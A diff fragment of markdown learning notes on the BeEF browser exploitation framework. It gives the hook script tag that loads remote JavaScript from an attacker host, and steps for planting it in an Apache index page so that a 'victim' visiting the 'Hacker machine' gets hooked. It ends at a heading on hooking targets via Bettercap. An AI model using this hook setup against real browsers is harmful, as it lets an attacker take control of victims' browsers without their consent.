+  - password : set by user
+- online browser : hooked to beef right now (you can control)
+- offline browser : browsers previously connected
+- to browser to get hook, specific javascript code need to executed
+  - can be seen on beef console
+  - hook code is : ```<script src="http://127.0.0.1;3000/hook.js"></script>```
+- work against all browser that runs Javascript
+- example:
+
+  ```txt
   paste hook code in /var/www/html/index.html
   replace the localhost address with the address of Hacker machine
   if somebody access Hacker ip address, it'll have a web server running on it which will execute index.html file
@@ -976,5 +1086,8 @@ you want to use.
   > service apache2 start
   access hackers ip address from victim's browser
   ```
+
   - Command tab that will be used to execute beef commands
   - xxRays shows XSS vulnerability
+
+## BeEF : Hooking Targets with Bettercap
